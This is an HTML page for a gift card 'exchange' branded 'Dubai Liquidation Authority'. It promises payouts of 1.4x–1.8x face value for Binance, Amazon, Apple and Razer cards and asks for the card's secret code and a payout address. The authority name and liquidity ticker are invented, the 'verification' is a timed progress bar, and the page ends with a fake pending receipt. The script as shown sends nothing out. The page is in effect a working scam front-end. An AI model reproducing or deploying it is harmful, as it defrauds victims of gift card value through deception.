<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DLA | Global Settlement</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #d4af37; --bg: #000; --panel: #0f1115; --error: #ef4444; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; }
        
        .ticker-wrap { width: 100%; background: #111; border-bottom: 1px solid var(--gold); padding: 10px 0; font-size: 11px; color: var(--gold); overflow: hidden; white-space: nowrap; }
        .ticker { display: inline-block; white-space: nowrap; animation: scrollText 25s linear infinite; padding-left: 100%; }
        @keyframes scrollText { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }

        .panel { background: var(--panel); border: 1px solid #222; padding: 25px; width: 92%; max-width: 440px; box-sizing: border-box; margin-top: 20px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        h2 { margin: 0; font-size: 24px; font-weight: 800; letter-spacing: -1px; }
        .tag { font-size: 10px; color: var(--gold); font-weight: bold; letter-spacing: 2px; margin-bottom: 25px; text-transform: uppercase; }
        
        label { font-size: 11px; color: #888; display: block; margin-top: 18px; margin-bottom: 8px; text-transform: uppercase; font-weight: 700; }
        input, select { width: 100%; padding: 14px; background: #16191e; border: 1px solid #333; color: #fff; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; }
        
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin: 15px 0; max-height: 200px; overflow-y: auto; padding: 10px; border: 1px solid #222; border-radius: 12px; background: #0a0c10; }
        .pay { border: 1px solid #333; padding: 12px 8px; text-align: left; font-size: 11px; cursor: pointer; color: #ccc; border-radius: 10px; background: #111; font-weight: bold; display: flex; align-items: center; gap: 8px; }
        .pay.active { border-color: var(--gold); background: rgba(212,175,55,0.15); color: #fff; }

        .res-box { background: #000; border: 1px solid var(--gold); padding: 15px; text-align: center; margin: 15px 0; border-radius: 16px; transition: 0.3s; }
        .res-box.invalid { border-color: var(--error); background: rgba(239, 68, 68, 0.1); }
        .res-box b { font-size: 34px; color: #fff; display: block; }
        #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; }

        .main-btn { width: 100%; padding: 18px; background: var(--gold); border: none; font-weight: 800; cursor: pointer; color: #000; border-radius: 14px; text-transform: uppercase; font-size: 14px; margin-top: 15px; }
        .main-btn:disabled { background: #333; color: #666; cursor: not-allowed; }

        #loader, #success { display: none; }
        #pbar { width: 0%; height: 6px; background: var(--gold); border-radius: 10px; transition: width 0.3s; }
        
        /* RECEIPT STYLES */
        .receipt-container { background: #fff; color: #000; padding: 25px; width: 100%; max-width: 370px; margin: 0 auto; border-radius: 4px; position: relative; }
        .cert-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px; }
        .cert-title { font-size: 22px; font-weight: 900; text-transform: uppercase; margin: 0; line-height: 1; }
        .r-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 12px; border-bottom: 1px solid #eee; padding-bottom: 4px; }
        .hero-box { text-align: center; padding: 15px 0; border-top: 3px solid #000; border-bottom: 3px solid #000; margin: 10px 0; }
        .hero-usd { font-size: 48px; font-weight: 900; display: block; }
        .black-banner { background: #000; color: #fff; text-align: center; padding: 10px; font-weight: 900; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT</div></div>

    <div class="panel">
        <div id="form">
            <h2>Exchange</h2>
            <div class="tag">Dubai Liquidation Authority</div>

            <label>Asset Class</label>
            <select id="brand" onchange="updateVal()">
                <option value="1.8">💳 Binance Gift Card [1.8x]</option>
                <option value="1.4">📦 Amazon Global [1.4x]</option>
                <option value="1.4">🍎 Apple iTunes [1.4x]</option>
                <option value="1.4">💎 Razer Gold [1.4x]</option>
            </select>

            <label>Card Secret Code</label>
            <input id="card" placeholder="ENTER CODE" oninput="this.value = this.value.toUpperCase()">

            <label>Value ($) - <small style="color:var(--gold)">MIN $20.00</small></label>
            <input id="amt" type="number" value="100" min="20" oninput="updateVal()">

            <div class="res-box" id="res-box">
                <span id="res-label" style="font-size:10px; color:var(--gold);">SETTLEMENT ESTIMATE</span>
                <div id="display-area"><b>$180.00</b></div>
                <div id="local-payout"></div>
            </div>

            <label>Payout Gateway</label>
            <div class="grid">
                <div class="pay" onclick="sel(this, '💎 USDT', 1, 'USDT')">USDT</div>
                <div class="pay" onclick="sel(this, '🇰🇪 M-Pesa', 131.50, 'KES')">M-Pesa</div>
                <div class="pay" onclick="sel(this, '🇳🇬 Bank', 1610, 'NGN')">Bank NG</div>
                <div class="pay" onclick="sel(this, '🔵 PayPal', 1, 'USD')">PayPal</div>
            </div>

            <input id="wallet" placeholder="Payout Address/Details" style="margin-top:10px;">

            <button class="main-btn" id="sub-btn" onclick="submitNow()">Authorize Settlement</button>
        </div>

        <div id="loader" style="text-align:center; padding:40px 0;">
            <p style="color:var(--gold); font-weight:bold;">VERIFYING ASSETS...</p>
            <div style="width:100%; height:6px; background:#222; border-radius:10px; overflow:hidden;"><div id="pbar"></div></div>
        </div>

        <div id="success">
            <div class="receipt-container" id="receipt-content">
                <div class="cert-header">
                    <h1 class="cert-title">SETTLEMENT<br>RECEIPT</h1>
                    <div style="font-weight:900; color:var(--gold); border:2px solid var(--gold); padding:5px; border-radius:50%; font-size:8px;">DLA</div>
                </div>
                <div class="r-row"><span>Status</span><span style="color:#b45309; font-weight:bold;">PENDING</span></div>
                <div class="r-row"><span>ID</span><span id="r-tid"></span></div>
                <div class="hero-box">
                    <span class="hero-usd" id="r-price"></span>
                </div>
                <div class="black-banner">EST. ARRIVAL: 01:00:00</div>
                <div id="qrcode" style="text-align:center; margin-top:15px;"></div>
            </div>
            <button class="main-btn" onclick="location.reload()">New Transaction</button>
        </div>
    </div>

    <script>
        let method = ""; let rateL = 1; let sym = "USD";

        function sel(el, val, r, s) {
            document.querySelectorAll('.pay').forEach(x => x.classList.remove('active'));
            el.classList.add('active');
            method = val; rateL = r; sym = s;
            updateVal();
        }

        function updateVal() {
            let v = parseFloat(document.getElementById('amt').value);
            let rate = parseFloat(document.getElementById('brand').value);
            let resBox = document.getElementById('res-box');
            let subBtn = document.getElementById('sub-btn');
            
            if (v < 20 || isNaN(v)) {
                resBox.classList.add('invalid');
                document.getElementById('display-area').innerHTML = '<b style="color:var(--error); font-size:16px;">AMOUNT TOO LOW</b>';
                document.getElementById('res-label').innerText = "MINIMUM $20.00 REQUIRED";
                subBtn.disabled = true;
                document.getElementById('local-payout').style.display = "none";
                return;
            }

            resBox.classList.remove('invalid');
            document.getElementById('res-label').innerText = "SETTLEMENT ESTIMATE";
            subBtn.disabled = false;

            let totalUSD = v * rate;
            document.getElementById('display-area').innerHTML = '<b>$' + totalUSD.toFixed(2) + '</b>';
            
            let lBox = document.getElementById('local-payout');
            if(rateL > 1) {
                lBox.style.display = "block";
                lBox.innerText = "(" + (totalUSD * rateL).toLocaleString() + " " + sym + ")";
            } else { lBox.style.display = "none"; }
        }

        function submitNow() {
            if(!method || !document.getElementById('card').value || !document.getElementById('wallet').value) return alert("Please fill all fields.");
            
            document.getElementById('form').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            
            let p = 0;
            let iv = setInterval(() => {
                p++; document.getElementById('pbar').style.width = p + "%";
                if(p>=100) { clearInterval(iv); showReceipt(); }
            }, 40);
        }

        function showReceipt() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('success').style.display = 'block';
            let tid = "DLA-" + Math.floor(100000 + Math.random() * 900000);
            document.getElementById('r-tid').innerText = tid;
            document.getElementById('r-price').innerText = document.getElementById('display-area').innerText;
            new QRCode(document.getElementById("qrcode"), { text: tid, width: 80, height: 80 });
        }
    </script>
</body>
</html>
